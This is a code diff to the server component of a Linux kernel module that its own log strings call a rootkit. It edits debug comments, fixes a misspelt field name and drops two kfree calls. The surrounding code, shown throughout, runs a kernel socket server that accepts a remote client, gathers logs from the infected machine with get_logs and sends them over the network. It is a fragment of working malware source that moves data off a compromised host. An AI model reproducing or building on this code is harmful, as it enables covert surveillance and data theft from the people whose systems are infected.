@@ -76,7 +76,7 @@ static int run_server(void *port){
 		printk("[rootkit] run_server- client accepted\n");
 		err = client_handler();
 		if (err<0){
-			printk("[rootkit][server.c::run_server] ERROR    error when handling client: err=%d\n", err); //prints debug info
+			printk("[rootkit][server.c::run_server] ERROR    error when handling client: err=%d\n", err); //DEBUG
 		}
 	}
 	return 0;
@@ -84,9 +84,7 @@ static int run_server(void *port){
 
 static int remove_server(void){
 	sock_release(client.sock);
-	kfree(client);
 	sock_release(server.sock);
-	kfree(server);
 	return 0;
 }
 
@@ -123,8 +121,8 @@ static int net_recv(void){
 	//  https://linux-kernel-labs.github.io/refs/heads/master/labs/networking.html
 	int err;
 	if (client.message == NULL){
-		printk("[rootkit][server.c::net_send] DEBUG    client.message is null, allocating memory...\n"); //prints debug info
-		client.mesage = kmalloc(BUFFER_SIZE, GFP_KERNEL); //not kzalloc because memory is zeroed out below
+		printk("[rootkit][server.c::net_send] DEBUG    client.message is null, allocating memory...\n"); //DEBUG
+		client.message = kmalloc(BUFFER_SIZE, GFP_KERNEL); //not kzalloc because memory is zeroed out below
 	}
 	memset(client.message, 0, BUFFER_SIZE); //zeroes out message buffer
 	memset(&(client.sock_msg), 0, sizeof(client.sock_msg)); //zeroes out message buffer
@@ -144,7 +142,7 @@ static int net_recv(void){
 
 
 static int client_handler(void){
-	printk("[rootkit][server.c::client_handler] DEBUG    client has initiated connection");
+	printk("[rootkit][server.c::client_handler] DEBUG    client has initiated connection");  //DEBUG
 
 	client.message = kzalloc(BUFFER_SIZE, GFP_KERNEL);
 	if (client.message == NULL) {
@@ -160,7 +158,7 @@ static int client_handler(void){
 		return -1;
 	}
 	get_logs(client.message); //cpies logs into message buffer
-	printk("[rootkit][server.c::client_handler] DEBUG    read log files\n");
+	printk("[rootkit][server.c::client_handler] DEBUG    read log files\n");  //DEBUG
 	net_send();
 	return 0;
 }
